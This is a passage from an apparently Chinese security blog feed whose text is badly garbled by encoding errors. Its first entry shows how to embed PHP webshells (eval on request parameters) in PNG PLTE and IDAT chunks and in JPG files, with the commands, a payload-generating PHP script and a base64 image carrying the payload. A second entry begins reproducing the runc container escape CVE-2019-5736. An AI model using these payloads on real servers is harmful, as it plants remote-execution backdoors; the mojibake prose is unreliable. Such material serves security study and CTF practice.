iA8L3g6eG1wbWV0YT4gPHhwYWNrZXQgZW5kPSJyIv8/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMDAgEAACH/C1hNUCBEYXRhWE1Q/z94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjAtYzA2MCA2MS4xMzQ3NzcsIDIwMTAvMDIvMTItMTc6MzI6MDAgICAgICAgICI+PHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3Lncub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJmOmFib3V0PSIiIP94bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bW5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgeG1wTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJFM0I0Mjk0MkFBNzExRTQ5QUZCOTk0ODYyRUNEMzRGIiB4bXD/TU06RG9jdW1lbnRJRD0ieG1wLmlkOkJFM0I0Mjk1MkFBNzExRTQ5QUZCOTk0ODYyRUNEMzRGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkUzQjQyOTIyQUE3MTFFNDlGQjk5NDg2MkVDRDM0RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCRTNCNDI5MzJBQTcxMUU0OUFGQjk5NDYyRUNEMzRGIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8eHBhY2tldCBlbmQ9InIi/z8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09HQz87NzMvKycjHxsXEw8LBwL++vby7urm4t7a1tLOysbCvrq2sq6qpqKempaSjoqGgn56dnJuamZiXlpWUk5KRkI+OjYyLiomIh4aFhIOCgYB/fn18e3p5eHd2dXRzcnFwb25tbGtqaWhnZmVkY2JhYF9eXVxbWllYV1ZVVFNSUVBPTk1MS0pJSEdGRURDQkFAPz49PDs6OTg3NjU0MzIxMC8uLSwrKikoJyYlJCMiISAfHh0cGxoZGBcWFRQTEhEQDw4NDAsKCQgHBgUEAwMCAQAAIfkEBAoA/wAsAAAAADAAMAAABv/AinBILBqPyKSySFk6n8imFJpsUonTq9YZkWyPVq0EIYh8z0NII0IAMCaOhPlLaVQkXucCQCgACgkBAHZfeQwIDk4OAAACjIwJeXQUCQALQhGJSHuPAAaSWw4FCwNuEgwDBUkRCY4AAw9Vep0JBoKqSGwBCppUYUMRroKMBXNHCo1oRpyMAQaxSY4KsloIAIIK0EiLAMYSIAkEAgHkAgN9CQzGR3sIhEoGf5itnfX1BAoQRwgBl0sRjBZIUEDOnsF6z4oI0paE04NSjBAsaPAAwokGCSAeBDBNyINrv5CUgijAHxgHGTb+abIHlxKAj4pVCGmkgb1hryS0MZmEwaP/A0KsUKA5hFuza48ItGEokpgQUEuQHVQwYQBRIh+vmUl09Ygre7HeRfHjJtirJBAY/GLWSUATiUGP2ORDgSyAXkSkClABzGACIeTWFXHlACYjO78gdFI7BGczOzD/HvHZiIJRAPqKdKBFpE2nAE0oBxAsxDNQw0CHWGELIm68TrgOPOLpcVhHBQJSG1HslMjrRx2/Wi0i1Q2UEelUC9HIKBHvR3gr2GWgjII9IZQfSX7qSBDtJRJipfCSvbfsTgOIOCgIAAEVFB5IrOBgooLnYf6+NpPUAKeACVCU8MEKIoSAwgj2bIVUJ72wxdETQ2WhkSACCFHcYkNcyAh1EA6hn8GCkAiRAAIG2PWgiAYhAGBXQ0wQj2PGiWIOeydWUMlBC7A4wQIWPOKYAApYk+IQN+J4RAQMnKeSSu6hCCJ6Q5ywwQEXLGnlNU1WoGE9oN0B40EDYGDAAOYohcAAjpnkoD12mKiSIOTA2Yh+xgnRn0ojXqnnI5lVAMGXnwG6p0FuEUHnoIg+YkARLybqaEBFrPnkoxsJ9oCglKpEABFBAAAh+QQFCgAWACwIAAQAKAAMAAAFdSBVjZVlnmiqrqtiSNVTMGRt33huAIgUAAkSa4hKLHAMAGAACDgaIqJU+RgxqpWJUskEHHPg2i+oABxIhK0ygA2HCwCBQ0kbldeJiFRaSajlIyZ0E3t7FQ4pAQYlhY0nEz9qCI6UJklNBAwSlZQNZhCcoQAqIQA7"></p>
<h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>PNG å¯ä»¥å°†æ•°æ®å†™å…¥åˆ° PLTE æ•°æ®å— æˆ–è€… IDAT æ•°æ®å—</p>
<h4 id="PLTE-æ•°æ®å—"><a href="#PLTE-æ•°æ®å—" class="headerlink" title="PLTE æ•°æ®å—"></a>PLTE æ•°æ®å—</h4><p>å…³äºå®ç°ç»†èŠ‚ä»¥å‰ä¹Œäº‘çŸ¥è¯†åº“çš„ä¸€ç¯‡æ–‡ç« å†™çš„å¾ˆè¯¦ç»†ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥é˜…è¯»çœ‹çœ‹ï¼š</p>
<p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun ä¹Œäº‘ - php imagecreatefrom* ç³»åˆ—å‡½æ•°ä¹‹ png</a></p>
<p>å†™å…¥ PLTE æ•°æ®å—å¹¶ä¸æ˜¯å¯¹æ‰€æœ‰çš„ PNG å›¾ç‰‡éƒ½æ˜¯å¯è¡Œçš„ï¼Œå®éªŒè¯æ˜åªæœ‰ç´¢å¼•å›¾åƒæ‰å¯ä»¥æˆåŠŸæ’å…¥ payloadï¼Œç°åº¦å’ŒçœŸå½©è‰²å›¾åƒå‡ä»¥å¤±è´¥å‘Šç»ˆã€‚</p>
<p>ä¿®æ”¹ç´¢å¼•å›¾åƒæ’å…¥ PHP ä»£ç çš„è„šæœ¬é¡¹ç›®åœ°å€ä¸ºï¼š<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p>
<p>å› ä¸ºå€¼æœ‰ç´¢å¼•å›¾åƒçš„ PNG æ‰å¯èƒ½æ’å…¥ PLTE æ•°æ®å—ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢å‡†å¤‡çš„ PNG å¹¶ä¸ç¬¦åˆè¦æ±‚ï¼Œå¾—éœ€è¦åœ¨ PS é‡Œé¢å°†å›¾ç‰‡æ¨¡å¼ä¿®æ”¹ä¸ºç´¢å¼•é¢œè‰²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure>

<h4 id="IDAT-æ•°æ®å—"><a href="#IDAT-æ•°æ®å—" class="headerlink" title="IDAT æ•°æ®å—"></a>IDAT æ•°æ®å—</h4><p>å†™å…¥IDATæ•°æ® è¿›è¡Œç»•è¿‡, è„šæœ¬å¦‚ä¸‹: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h3><p>åœ¨ github å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°è¿™æ ·çš„é¡¹ç›®</p>
<p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan&#x2F;jpg_payload</a></p>
<p>å‡†å¤‡ä¸€ä¸ª jpg å›¾ç‰‡ï¼š</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_1495711556.jpg" alt="1495711556"></p>
<p>å»ºè®®åœ¨Linux ä¸‹ç¯å¢ƒè¿è¡Œ, windows ä¸‹å®¹æ˜“æŠ¥é”™, ä¸”éœ€è¦ å¼€å¯ä¸€ä¸ªæ‹“å±•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br></pre></td></tr></table></figure>



<p>å¾—åˆ°æ–°å›¾ç‰‡, payload: <code>&lt;?php @eval($_POST[1])?&gt;</code></p>
<p><img src="data:image/jpg;base64,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"></p>
<p>æœªå®Œå¾…ç»­â€¦..</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
        <tag>æ‚è°ˆ</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5736-Dockeré€ƒé€¸RunCæ¼æ´å¤ç°</title>
    <url>/articles/de574863/</url>
    <content><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p> Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäºGo è¯­è¨€å¹¶éµä»Apache2.0åè®®å¼€æºã€‚ Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ° Linux æˆ– Windows æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ å› ä¸ºDockerå®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼ŒDockeré€ƒé€¸æ¼æ´ä¾¿æˆäº†Dockerçš„æ¼æ´ä¸»è¦åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚</p>
<p> Dockeré€ƒé€¸RunCæ¼æ´ï¼Œåœ¨Docker 18.09.2ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨äº†çš„RunCç‰ˆæœ¬å°äº1.0-rc6ï¼Œå…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„RunC äºŒè¿›åˆ¶æ–‡ä»¶,  ä»è€Œä½¿å¾—å®¿ä¸»æœºä»¥rootæ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œè·å–å®¿ä¸»æœºæ§åˆ¶æƒé™ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290912214.jpg" alt="img"></p>
<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><hr>
<blockquote>
<p>  æ¼æ´æ˜¯æŒ‡åº”ç”¨è½¯ä»¶æˆ–æ“ä½œç³»ç»Ÿè½¯ä»¶åœ¨é€»è¾‘è®¾è®¡ä¸Šçš„ç¼ºé™·æˆ–åœ¨ç¼–å†™æ—¶äº§ç”Ÿçš„é”™è¯¯ï¼Œè¿™ä¸ªç¼ºé™·æˆ–é”™è¯¯å¯ä»¥è¢«ä¸æ³•è€…æˆ–è€…ç”µè„‘é»‘å®¢åˆ©ç”¨ï¼Œé€šè¿‡æ¤å…¥æœ¨é©¬ã€ç—…æ¯’ç­‰æ–¹å¼æ¥æ”»å‡»æˆ–æ§åˆ¶æ•´ä¸ªç”µè„‘ï¼Œä»è€Œçªƒå–ç”µè„‘ä¸­çš„é‡è¦èµ„æ–™å’Œä¿¡æ¯ï¼Œç”šè‡³ç ´åç³»ç»Ÿã€‚ç°ä»£åŒ–çš„ç¤¾ä¼šå‘å±•ä¸ºäººä»¬è®¾è®¡äº†è‡ªç”±ã€å…±äº«çš„ç½‘ç»œç¯å¢ƒï¼Œè¿™ä¿ƒä½¿äººä»¬çš„ç”Ÿæ´»ã€å·¥ä½œä»¥åŠå­¦ä¹ å¾—åˆ°äº†æœ‰æ•ˆæ”¹å–„ï¼Œä¹Ÿä¸ºç½‘ç»œå®‰å…¨æ¼æ´é—®é¢˜çš„çªæ˜¾æä¾›äº†å¹³å°ã€‚</p>
</blockquote>
<h3 id="Dockeré€ƒé€¸RunCæ¼æ´"><a href="#Dockeré€ƒé€¸RunCæ¼æ´" class="headerlink" title="Dockeré€ƒé€¸RunCæ¼æ´"></a>Dockeré€ƒé€¸RunCæ¼æ´</h3><hr>
<blockquote>
<p>  CVE-2019-5736æ˜¯2019å¹´2æœˆ11æ—¥åœ¨oss-securityé‚®ä»¶åˆ—è¡¨æŠ«éœ²çš„runcå®¹å™¨é€ƒé€¸æ¼æ´ã€‚</p>
<p>  åœ¨Docker 18.09.2ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨äº†çš„runcç‰ˆæœ¬å°äº1.0-rc6ï¼Œå› æ­¤å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥æ„Ÿè§‰ä»¥rootçš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œå¯¼è‡´è·å¾—å®¿ä¸»æœºçš„rootæƒé™ã€‚</p>
<p>  åˆ©ç”¨æ–¹å¼ï¼š</p>
<ol>
<li>å®¿ä¸»æœºåˆ©ç”¨æ”»å‡»è€…æä¾›çš„imageæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„container ã€‚æˆ–</li>
<li>æ‹¥æœ‰container rootæƒé™ï¼Œå¹¶ä¸”è¯¥containeråç»­è¢«docker exec attachã€‚</li>
</ol>
<p>   ä¸€å¥è¯æè¿°ï¼Œdocker 18.09.2ä¹‹å‰çš„runcå­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹runcçš„äºŒè¿›åˆ¶æ–‡ä»¶å¯¼è‡´ææƒã€‚</p>
<p>   å½±å“ï¼š</p>
<ul>
<li>docker version &lt;&#x3D;18.09.2 ï¼ˆç„¶è€Œå®é™…æµ‹è¯•çš„ç»“æœæ˜¯docker version 18.09.1å¤±è´¥ï¼‰</li>
<li>RunC version &lt;&#x3D;1.0-rc6</li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290915562.jpg-w331s" alt="docker6"></p>
<h2 id="ç›¸å…³å·¥å…·åŠæŠ€æœ¯"><a href="#ç›¸å…³å·¥å…·åŠæŠ€æœ¯" class="headerlink" title="ç›¸å…³å·¥å…·åŠæŠ€æœ¯"></a>ç›¸å…³å·¥å…·åŠæŠ€æœ¯</h2><h3 id="Vmware-Workstation"><a href="#Vmware-Workstation" class="headerlink" title="Vmware Workstation"></a>Vmware Workstation</h3><hr>
<p>VMware Workstationä½¿ä¸“ä¸šæŠ€æœ¯äººå‘˜èƒ½å¤Ÿåœ¨åŒä¸€å° PCä¸ŠåŒæ—¶è¿è¡Œå¤šä¸ªåŸºäº x86 çš„ Windowsã€Linux å’Œå…¶ä»–æ“ä½œç³»ç»Ÿï¼Œä»è€Œå¼€å‘ã€æµ‹è¯•ã€æ¼”ç¤ºå’Œéƒ¨ç½²è½¯ä»¶ã€‚</p>
